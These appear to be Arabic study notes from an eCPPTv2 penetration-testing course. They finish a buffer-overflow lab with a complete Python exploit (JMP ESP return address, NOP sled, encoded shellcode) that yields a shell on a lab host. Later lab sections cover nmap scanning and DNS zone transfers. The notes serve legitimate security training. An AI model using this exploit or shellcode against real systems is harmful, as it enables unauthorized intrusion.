# Session 3 (eCPPTv2) - Day 3  
## Penetration Testing: System Security Part 3  

السلام عليكم ورحمة الله وبركاته  

اليوم باذن الله راح نبدا من الي وقفنا عليه امس  

اليوم باذن الله راح نركز الصعبه علينا امس  
JUMP to ESP هذا كان فيه اشكالية عند الاغلب ف بنعيده  


اول شي بنجرب الطريقة اليدوية  

طبعا راح نكتب هذا الكود  
```python
```  

طيب اول شي بنشوفه الي هو البادنق لو نخليه 
```bash
4*"A"  
```  

بنشوف انه مايضبط ولو حطيناه 7 راح لانه راح ينقص بايت من الشيل حقك  
لو نخليه 8 راح يضبط بدون اي مشاكل  
الـ EIP = BBBB  

الان نشوف الستاك فيه ال BBBB تحتها 8 مرات مكتوب 90  
طبعا ناخذ الادرس الي بعد الـ 8مرات 90  

وهذا هو راح يكون بداية الشيل تبعنا  
ولابد يكتب الادرس بشكل هيكس ومعروف انه ليتيل انديان  

طيب الان لو نحاول نستغله راح يتغير الادرس ماراح يروح للادرس حقنا الي حصلناه بعد الثمان مرات 90  

فنشوف انه فعلا تغير الادرس فالان عاد تقعد تجرب تسوي اكسبلويت لين يجي على الادرس الي حطيناه بالكود  
يعني تقدر تقول كانه brute force  

طبعا نقدر نحل المشكله باننا نستخدم JMP to ESP  

طيب بعد مانطلع البادكراكترز الان ونبي نطلع الـ JMP ESP عشان نتفادا المشاكل  
```bash
!mona jmp -r esp -cpb "<BAD_CHARS>"
```  

ونشوف انه مثلا عطانا 9 ادرسس مافيهم الباد كراكترز الي حددناه بالامر السابق  
ف مثلا عطانا هذا الادرس  
```bash
625011AF
```  
راح نكتبه بهذا الشكل في الـ return  
```bash
\xAF\x11\x50\x62
```  

والان نقدر نكتب الاكسبلويت حقنا بدون اي مشاكل وراح يتنفذ علطول مايحتاج نقدر نجرب اكثر من مره ونسوي رن ونشوف هل بيجي الادرس حقنا او لا  

طبعا الان لو نستغله بنشوف انه حصلنا مشكله جديده والي هي الثمان مرات 90 صارت ثمان مرات 0 وهذا المشكله  

طيب وش السبب والله ماعرف ماتعمقت بهذا الموضوع مره ف عشان ال layout memory  
طبعا نزيد 4 ثانيه ف بيصير عندنا 12 مره 90  

ونجرب نستغل....  
```python
```import socket
ip = "10.10.60.243"
port = 1337
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 24

buf =  ""
buf += "\xdb\xc6\xd9\x74\x24\xf4\xbd\xe7\xa2\xa4\xa8\x5a"
buf += "\x31\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17\x83\x25"
buf += "\xa6\x46\x5d\x55\x4f\x04\x9e\xa5\x90\x69\x16\x40"
buf += "\xa1\xa9\x4c\x01\x92\x19\x06\x47\x1f\xd1\x4a\x73"
buf += "\x94\x97\x42\x74\x1d\x1d\xb5\xbb\x9e\x0e\x85\xda"
buf += "\x1c\x4d\xda\x3c\x1c\x9e\x2f\x3d\x59\xc3\xc2\x6f"
buf += "\x32\x8f\x71\x9f\x37\xc5\x49\x14\x0b\xcb\xc9\xc9"
buf += "\xdc\xea\xf8\x5c\x56\xb5\xda\x5f\xbb\xcd\x52\x47"
buf += "\xd8\xe8\x2d\xfc\x2a\x86\xaf\xd4\x62\x67\x03\x19"
buf += "\x4b\x9a\x5d\x5e\x6c\x45\x28\x96\x8e\xf8\x2b\x6d"
buf += "\xec\x26\xb9\x75\x56\xac\x19\x51\x66\x61\xff\x12"
buf += "\x64\xce\x8b\x7c\x69\xd1\x58\xf7\x95\x5a\x5f\xd7"
buf += "\x1f\x18\x44\xf3\x44\xfa\xe5\xa2\x20\xad\x1a\xb4"
buf += "\x8a\x12\xbf\xbf\x27\x46\xb2\xe2\x2f\xab\xff\x1c"
buf += "\xb0\xa3\x88\x6f\x82\x6c\x23\xe7\xae\xe5\xed\xf0"
buf += "\xd1\xdf\x4a\x6e\x2c\xe0\xaa\xa7\xeb\xb4\xfa\xdf"
buf += "\xda\xb4\x90\x1f\xe2\x60\x36\x4f\x4c\xdb\xf7\x3f"
buf += "\x2c\x8b\x9f\x55\xa3\xf4\x80\x56\x69\x9d\x2b\xad"
buf += "\xfa\xa8\xa1\x6e\xcb\xc4\xb7\x70\x3d\x49\x31\x96"
buf += "\x57\x61\x17\x01\xc0\x18\x32\xd9\x71\xe4\xe8\xa4"
buf += "\xb2\x6e\x1f\x59\x7c\x87\x6a\x49\xe9\x67\x21\x33"
buf += "\xbc\x78\x9f\x5b\x22\xea\x44\x9b\x2d\x17\xd3\xcc"
buf += "\x7a\xe9\x2a\x98\x96\x50\x85\xbe\x6a\x04\xee\x7a"
buf += "\xb1\xf5\xf1\x83\x34\x41\xd6\x93\x80\x4a\x52\xc7"
buf += "\x5c\x1d\x0c\xb1\x1a\xf7\xfe\x6b\xf5\xa4\xa8\xfb"
buf += "\x80\x86\x6a\x7d\x8d\xc2\x1c\x61\x3c\xbb\x58\x9e"
buf += "\xf1\x2b\x6d\xe7\xef\xcb\x92\x32\xb4\xec\x70\x96"
buf += "\xc1\x84\x2c\x73\x68\xc9\xce\xae\xaf\xf4\x4c\x5a"
buf += "\x50\x03\x4c\x2f\x55\x4f\xca\xdc\x27\xc0\xbf\xe2"
buf += "\x94\xe1\x95"


postfix = ""
buffer = prefix + overflow + retn + padding + buf 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer , "latin-1"))
  print("Done!")
except:
  print("Could not connect.")```
```  
ونشوف انه فعلا اخذنا shell  

الى هنا الحمدالله خلصنا الـ Buffer OverFlow  

راح ندخل بقسم جديد باذن الله  

---  

## Penetration Testing: Network Security  

طيب بسمالله اول لاب معنا اليوم هو

Information Gathering
----------------------|  

طيب بسمالله اول شي بنشوف الايبي تبعنا ونفحص الشبكة كامله  
```bash
nmap -sn 192.115.225.0/24  
```  
-sn راح يسوي لنا ping scan ونشوف ايش الهوستات الشغاله  

نشوف انه عطانا عدد من الايبيهات الي شغاله  
```bash
192.115.225.3  
192.115.225.4  
192.115.225.5  
192.115.225.6  
192.115.225.7  
192.115.225.8  
192.115.225.9  
192.115.225.2  
```  

طيب الان مطلوب مننا نطلع له وش الهوست الي شغال عليه DNS (port 53)  

راح ننفذ هذا الامر  
```bash
nmap -sV -p 53 192.115.225.0/24 --open  
```  
ونشوف انه عطانا انه الايبي التالي مفتوح عليه بورت 53  
```bash
192.115.225.3 53/tcp open  
```  

طيب الان راح نستغله باستخدام اداة nslookup  
```bash
nslookup  
server 192.115.225.3  
set q=NS  
witrap.com  
exit  
```  

ونشوف انه حصلنا subdomains  
```bash
secondary.witrap.com  
primary.witrap.com  
```  

خلونا نرجع نسوي enumeration عن الـ subdomains الي حصلناها  
```bash
nslookup  
server 192.115.225.3  
secondary.witrap.com  
primary.witrap.com  
```  

نفس ماقبل بحثنا عن NS records الان راح نسوي اتسطلاع على الـ MX records  
```bash
nslookup  
server 192.115.225.3  
set q=MX  
witrap.com  
exit  
```  

طيب نشوف الان انه عطانا tow MX records  
```bash
mail exchanger = 10 mx.witrap.com  
mail exchanger = 20 mx2.witrap.com  
```  

طبعا فيه اداة تختصر علينا كلشي الي هي dig  
```bash
dig @192.115.225.3 witrap.com -t AXFR +nocooke  
```  

الان نشوف انه حصلنا الفلاق في ريكورد TXT  

وفيه سوال حق الـ ldap بعد حصلناه الي هو الهوست 192.115.255.8  

طبعا الان عشان نحدد له رينج موجود على السيرفر loccally يعني  
```bash
dig axfr -x 192.168 @192.115.225.3  
```  

نشوف انه عطانا subdomains ماكانت موجوده قبل وكذالك معطينا الايبي تبع كل subdomain  

فيه اداة اسمها host نفس المخرجات لكن هنا يختلف الـ syntax  
```bash
host -t axfr witrap.com 192.115.225.3  
```  

الى هنا انتهى اللاب نشوف الي بعده  

---

Scanning  
---------|  

طبعا نشوف انه معطينا 3 تارقت  
```bash

Target 1 : 10.0.18.252
Target 2 : 10.0.19.38
Target 3 : 10.0.18.58
```  


راح نسوي سكان  الان ونحفظ الملف بصيغة xml  
```bash
nmap -PE -sn -n  10.0.18.0/20 -oX scan.xml  
```  
-PE enables ICMP Echo request host discovery (Ping scan).  
-oX tells Nmap to save the results into an XML file (in our case, the filename is scan.xml and is present in /root/scan.xml).  


طيب الان راح نفحص اول تارقت  
```bash
nmap 10.0.18.252  
```  

طبعا نشوف انه يرفض لانه مايقبل الـ disabled ICMp echo request فراح نستعمله اوبشن الي هو -Pn  
```bash
nmap -Pn 10.0.18.252  
```  

طبعا نشوف انه فعلا قبل الان وعطانا ايش البورتات الشغاله وكلشي تمام  
-Pn option treats all hosts online and skips the host discovery part.It scans the host ports without confirming whether the host is alive or not. So, to scan the Target 1 using nmap, we must use the -Pn option and other options.  


طبعا فيه حالات معينه للبورتات في الـ nmap  
```bash
open SYN > SYN ACK
close SYN > REST
Filterd SYN > DROPED
```  

نشوف انه بورت 3389 مفتوح خلونا نشوف كل التارقت بنفحصهم بنشوف فيه تارقت ثاني مفتوح عليه هذا البورت او لا  
```bash
nmap -Pn -p 3389 -iL /root/Desktop/target  
```  

نشوف انه فيه اكثر من هوست شغال عليه البورت  

طيب خلونا الان نفحص بورتات ثانيه على كل التارقتس مثلا بورت 135و53  
```bash
nmap -Pn -p 135,53 -iL /root/Desktop/target  
```  

الان نشوف انه بعد البورتين هذي شغاله على اكثر من تارقت  

الان راح نشوف طريقة كيف نعرف ايش نظام التشغيل الي شغال على التارقت  
```bash
nmap -O -A 10.0.19.38 --osscan-guess  
```  
-A Enable OS detection, version detection, script scanning, and traceroute  
-O tells Nmap to perform an OS fingerprinting  
--ossscan-guess is to guess OS more aggressively.  

نشوف انه الان عطانا ايش هو نظام التشغيل والي هو Windows Server 2012 R  

الان راح نفحص تارقت 3 ونشوف ايش الخدمات المفتوحه عليه واصدارها  
```bash
nmap -sV 10.0.18.58  
```  
-sV Probe open ports to determine service/version info.  

نشوف انه فعلا عطانا السيرفس المفتوحه واصدار كل وحده فيهم  

خلونا نشوف الان بورت 53 هل هو مفتوح او لا  
```bash
nmap -sV -p 53 10.0.18.58  
```  
ونشوف الان انه فعلا مفتوح  

الى هنا انتهى اللاب وعرفنا بعض الاوبشن بالـ nmap  
وتكلمنا كذالك عن البفر وانهيناه كامل الحمدالله  

راح نكمل بكرا باذن الله وفيه اشياء تحمس باذن الله بكرا اول لاب معنا بيكون جدا ممتاز  

---  

## Follow us on:  
Twitter:  
[s4cript](https://twitter.com/s4cript)  
[cyberhub](https://twitter.com/cyberhub)  
[0xNawaF1](https://twitter.com/0xNawaF1)  